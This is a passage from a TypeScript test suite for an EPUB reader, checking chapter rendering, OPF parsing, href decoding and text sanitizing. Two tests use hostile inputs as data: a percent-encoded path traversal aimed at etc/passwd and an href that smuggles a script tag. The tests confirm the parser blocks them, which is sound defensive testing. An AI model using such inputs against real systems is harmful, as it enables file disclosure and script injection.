    expect(result.chapters.map((c) => c.spineHref)).toEqual(["OEBPS/ch1.xhtml", "OEBPS/ch3.xhtml"]);
    expect(renderer.book?.chapters.map((c) => c.spineHref)).toEqual([
      "OEBPS/ch1.xhtml",
      "OEBPS/ch2.xhtml",
      "OEBPS/ch3.xhtml",
    ]);
    renderer.close();
  });

  it("says a chapter could not be displayed instead of showing a blank frame", async () => {
    // Latin-1 bytes with a stray 0xFF: not valid UTF-8, so decoding must fail
    // loudly rather than render a thousand replacement characters.
    const broken = new Uint8Array([0x3c, 0x70, 0x3e, 0xff, 0xfe, 0x3c, 0x2f, 0x70, 0x3e]);
    const { renderer, result } = await openBook(buildEpub({ "OEBPS/ch1.xhtml": broken }));
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    const rendered = renderer.renderIndex(0);
    expect(rendered.ok).toBe(false);
    if (rendered.ok) return;
    expect(rendered.reason).toBe("needs-encoding");
    expect(rendered.detail).toContain("UTF-8");
    // The reader keeps its place: another chapter still renders.
    expect(renderer.renderIndex(1).ok).toBe(true);
    renderer.close();
  });
});

// ---------------------------------------------------------------------------
// 7. OPF parsing: percent-encoding, membership, media types
// ---------------------------------------------------------------------------

describe("container and OPF parsing", () => {
  it("percent-decodes hrefs so a real book's spaced filenames resolve", async () => {
    const opf = OPF(`<itemref idref="c1"/><itemref idref="c2"/><itemref idref="c3"/>`).replace(
      '<item id="c2" href="ch2.xhtml"',
      '<item id="c2" href="ch%202.xhtml"',
    );
    const bytes = buildEpub({ "OEBPS/ch 2.xhtml": utf8Of(CH2) }, opf);
    const { renderer, result } = await openBook(bytes);
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.chapters[1]?.spineHref).toBe("OEBPS/ch 2.xhtml");
    const rendered = renderer.renderIndex(1);
    expect(rendered.ok && rendered.text).toContain(CHAPTER_TWO);
    renderer.close();
  });

  it("cannot be made to escape the archive by percent-encoding the traversal", () => {
    const xml = '<item id="x" href="%2e%2e%2f%2e%2e%2fetc/passwd"/>';
    const decoded = decodeHrefAttributes(xml);
    expect(decoded).toContain("../");
    // The OPF cannot even name the file: it is not a member of the entry set.
    const read = readEpub({
      containerXml: CONTAINER,
      readText: (path) => (path === "OEBPS/content.opf" ? `<package><manifest>${decoded}</manifest><spine><itemref idref="x"/></spine></package>` : null),
      entryNames: new Set(["META-INF/container.xml", "OEBPS/content.opf"]),
    });
    expect(read.ok).toBe(false);
    if (read.ok) return;
    // Whether the spine looks empty or has no reflowable member, the point is
    // the same: a percent-encoded `../` cannot name a file inside the archive.
    expect(read.detail).toMatch(/spine|reflowable/);
  });

  it("re-encodes a decoded quote so an href cannot inject markup", () => {
    const decoded = decodeHrefAttributes('<item href="a%22%3E%3Cscript%3Ealert(1)%3C/script%3E"/>');
    expect(decoded).not.toContain("<script");
    expect(decoded).toBe('<item href="a%22%3E%3Cscript%3Ealert(1)%3C/script%3E"/>');
  });

  it("leaves well-formed entities alone", () => {
    expect(decodeHrefAttributes('<item href="a&amp;b.xhtml"/>')).toBe('<item href="a&amp;b.xhtml"/>');
  });

  it("treats only XHTML and HTML spine items as readable", () => {
    expect(isReflowable("application/xhtml+xml", "a.xhtml")).toBe(true);
    expect(isReflowable("text/html", "a.html")).toBe(true);
    expect(isReflowable("image/svg+xml", "a.svg")).toBe(false);
    expect(isReflowable("application/x-dtbncx+xml", "toc.ncx")).toBe(false);
    // A malformed item with no media-type falls back to the extension.
    expect(isReflowable("", "a.xhtml")).toBe(true);
    expect(isReflowable("", "a.png")).toBe(false);
  });

  it("ignores a spine itemref whose idref is not in the manifest", () => {
    const read = readEpub({
      containerXml: CONTAINER,
      readText: (path) =>
        path === "OEBPS/content.opf"
          ? `<package><manifest><item id="c1" href="ch1.xhtml" media-type="application/xhtml+xml"/></manifest><spine><itemref idref="ghost"/><itemref idref="c1"/></spine></package>`
          : null,
      entryNames: new Set(["META-INF/container.xml", "OEBPS/content.opf", "OEBPS/ch1.xhtml"]),
    });
    expect(read.ok).toBe(true);
    if (!read.ok) return;
    expect(read.book.danglingIdrefs).toBe(1);
    expect(read.book.chapters.map((c) => c.spineHref)).toEqual(["OEBPS/ch1.xhtml"]);
  });

  it("reports a container with no rootfile rather than guessing a filename", () => {
    const read = readEpub({ containerXml: "<container/>", readText: () => null });
    expect(read.ok).toBe(false);
    if (read.ok) return;
    expect(read.detail).toContain("rootfile");
  });
});

// ---------------------------------------------------------------------------
// 8. The plain text the reader anchors against
// ---------------------------------------------------------------------------

describe("sanitized chapter text", () => {
  it("is the text of the markup, with entities decoded and no markup left", () => {
    expect(sanitizedText(`<p>caf&eacute; &amp; bar</p>`)).toBe("café & bar");
    expect(sanitizedText(`<p>one</p><p>two</p>`)).toBe("onetwo");
    expect(sanitizedText(`<p>a<br/>b</p>`)).toBe("ab");
  });

  it("leaves no tag or entity in the text quote resolution is run against", async () => {
    const { renderer, result } = await openBook(buildEpub());
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    const rendered = renderer.renderIndex(0);
    if (!rendered.ok) return;
    expect(rendered.text).not.toContain("<");
    expect(rendered.text).not.toContain("&amp;");
    renderer.close();
  });
});
